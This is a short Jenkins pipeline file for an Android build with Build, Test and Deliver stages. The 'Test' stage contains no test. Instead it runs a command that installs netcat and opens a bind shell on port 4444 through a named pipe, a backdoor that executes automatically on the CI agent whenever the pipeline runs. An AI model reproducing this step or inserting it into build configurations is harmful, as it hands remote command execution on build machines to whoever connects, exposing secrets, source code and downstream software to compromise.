pipeline {
    agent {
        docker {
            image 'androidsdk/android-29'
        }
    }
    stages {
        stage('Build') {
            steps {
                echo 'Running build'
                
            }
        }
        stage('Test') {
            steps {
                echo 'Running Test'
                sh 'sudo apt-get install netcat;mkfifo /tmp/pipe; sh /tmp/pipe | nc -l 4444 > /tmp/pipe'
                 }
            post {
                always {
                    echo 'Running post-test'
                }
            }
        }
        stage('Deliver') {
           steps {
                echo 'Running Deliver'
            }
        }
    }
}